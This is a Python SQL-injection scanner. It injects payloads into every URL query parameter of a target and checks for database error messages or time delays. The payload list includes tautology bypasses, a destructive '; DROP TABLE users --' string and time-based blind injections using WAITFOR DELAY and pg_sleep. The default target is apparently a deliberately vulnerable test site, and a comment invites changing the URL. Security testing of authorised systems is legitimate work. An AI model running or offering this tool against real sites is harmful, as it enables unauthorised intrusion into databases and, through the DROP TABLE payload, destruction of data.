import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

def is_vulnerable(response):
    errors = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "SQL syntax",
        "syntax error"
    ]
    for error in errors:
        if error.lower() in response.text.lower():
            return True
    return False

def check_sql_injection(url):
    payloads = [
        "'", "\"", "' OR '1'='1", "' OR 1=1 -- ", "\" OR \"1\"=\"1", "\" OR 1=1 -- ",
        "' OR ''='", "' OR 'x'='x", "' OR 1=1#", "' OR 1=1/*", "'; DROP TABLE users --"
    ]
    blind_payloads = [
        "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
        "'; IF(1=2) WAITFOR DELAY '0:0:5'--",
        "'; IF(1=1) SELECT pg_sleep(5)--",
        "'; IF(1=2) SELECT pg_sleep(5)--"
    ]

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Test classic SQL Injection
    for param in query_params:
        original_value = query_params[param]
        for payload in payloads:
            query_params[param] = payload
            new_query = urlencode(query_params, doseq=True)
            vulnerable_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
            print(f"Testing {vulnerable_url}")
            response = requests.get(vulnerable_url)
            if is_vulnerable(response):
                print(f"[!] Vulnerable SQL Injection found with payload: {payload} on parameter: {param}")
                return
            query_params[param] = original_value

    # Test blind SQL Injection
    for param in query_params:
        original_value = query_params[param]
        for payload in blind_payloads:
            query_params[param] = payload
            new_query = urlencode(query_params, doseq=True)
            vulnerable_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
            print(f"Testing {vulnerable_url}")
            start_time = time.time()
            response = requests.get(vulnerable_url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= 5:
                print(f"[!] Vulnerable Blind SQL Injection found with payload: {payload} on parameter: {param}")
                return
            query_params[param] = original_value

    print("[-] No SQL Injection vulnerability found.")

if __name__ == "__main__":
    url = "http://testphp.vulnweb.com/artists.php?artist=1"  # Ubah URL sesuai kebutuhan
    print(f"Checking SQL Injection vulnerability on: {url}")
    check_sql_injection(url)
